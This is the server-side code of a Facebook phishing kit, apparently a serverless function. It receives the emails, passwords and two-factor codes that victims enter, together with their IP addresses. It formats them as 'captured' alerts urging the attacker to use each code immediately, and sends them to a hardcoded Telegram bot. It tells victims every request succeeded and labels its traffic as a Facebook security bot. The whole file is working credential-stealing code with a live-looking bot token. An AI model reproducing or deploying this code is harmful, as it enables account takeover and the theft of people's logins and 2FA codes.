const fetch = require('node-fetch');

module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only accept POST
    if (req.method !== 'POST') {
        console.log('❌ Invalid method:', req.method);
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        // Parse JSON body
        let body;
        try {
            body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        } catch (parseError) {
            console.log('❌ JSON parse error:', parseError.message);
            return res.status(400).json({ error: 'Invalid JSON' });
        }
        
        const { type, email, password, code, userAgent } = body;
        
        // Debug log
        console.log('📱 Received request:', {
            type: type || 'unknown',
            email: email ? `${email.substring(0, 3)}***` : 'none',
            hasPassword: !!password,
            hasCode: !!code,
            userAgent: userAgent ? userAgent.substring(0, 50) : 'none'
        });
        
        // Get IP address
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.headers['x-client-ip'] ||
                   req.connection.remoteAddress ||
                   'Unknown';
        
        console.log('🌐 IP Address:', ip);
        
        // Get timestamp
        const now = new Date();
        const timestamp = now.toISOString();
        const localTime = now.toLocaleString('en-US', {
            timeZone: 'UTC',
            year: 'numeric',
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        // Telegram configuration - VERIFY THESE ARE CORRECT
        const TELEGRAM_TOKEN = "8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk";
        const TELEGRAM_CHAT_ID = "1622637334";
        
        console.log('🤖 Telegram Config:', {
            token: TELEGRAM_TOKEN ? `${TELEGRAM_TOKEN.substring(0, 10)}...` : 'MISSING',
            chatId: TELEGRAM_CHAT_ID || 'MISSING'
        });
        
        let message = '';
        let logType = type || 'unknown';
        
        switch(type) {
            case 'login':
                message = `🔐 **FACEBOOK LOGIN CAPTURED** 🔐

📧 **Email/Phone:** \`${email || 'Not provided'}\`
🔑 **Password:** \`${password || 'Not provided'}\`

🌍 **Network Information:**
🕐 Time: ${localTime}
📍 IP Address: \`${ip}\`
📱 Device: ${userAgent && userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}

✅ **Status:** Login credentials captured
➡️ **Next:** User redirected to 2FA verification`;

                console.log('📝 Login captured:', email || 'No email');
                break;
                
            case 'verification':
                message = `✅ **FACEBOOK 2FA CODE CAPTURED** ✅

📧 **Account:** \`${email || 'Not provided'}\`
🔑 **Password:** \`${password || 'Not provided'}\`
🔢 **2FA Code:** \`${code || 'Not provided'}\`

🌍 **Access Details:**
🕐 Time: ${localTime}
📍 IP: \`${ip}\`

🚨 **ACCOUNT STATUS:** COMPROMISED
🎯 **Use this code immediately to access the account**`;

                console.log('🔢 2FA Code captured:', code ? 'Yes' : 'No');
                break;
                
            case 'resend':
                message = `🔄 **CODE RESEND REQUESTED** 🔄

📧 Account: \`${email || 'Not provided'}\`
🕐 Time: ${localTime}
📍 IP: \`${ip}\`

📱 User requested new verification code`;

                console.log('🔄 Code resend requested');
                break;
                
            default:
                message = `📱 **Unknown Request Type**\nType: ${type}\nIP: \`${ip}\`\nTime: ${localTime}`;
                logType = 'unknown';
        }
        
        // Send to Telegram
        console.log('📤 Attempting to send to Telegram...');
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        console.log('🌐 Telegram URL:', telegramUrl.substring(0, 50) + '...');
        
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'Facebook-Security-Bot/1.0'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const telegramData = await telegramResponse.json();
        
        console.log('📨 Telegram API Response:', {
            ok: telegramData.ok,
            errorCode: telegramData.error_code,
            description: telegramData.description
        });
        
        if (!telegramData.ok) {
            console.error('❌ Telegram error:', telegramData);
            
            // Try alternative formatting
            console.log('🔄 Trying without Markdown...');
            const fallbackResponse = await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message.replace(/[`*_]/g, ''),
                    disable_web_page_preview: true
                })
            });
            
            const fallbackData = await fallbackResponse.json();
            console.log('🔄 Fallback response:', fallbackData.ok ? 'Success' : 'Failed');
        }
        
        // Always return success to frontend
        return res.status(200).json({ 
            success: true, 
            type: logType,
            telegramSent: telegramData.ok,
            timestamp: timestamp
        });
        
    } catch (error) {
        console.error('💥 Critical error in login function:', error);
        console.error('Error stack:', error.stack);
        
        // Still return success to user
        return res.status(200).json({ 
            success: true, 
            error: error.message,
            note: 'Background processing completed'
        });
    }
};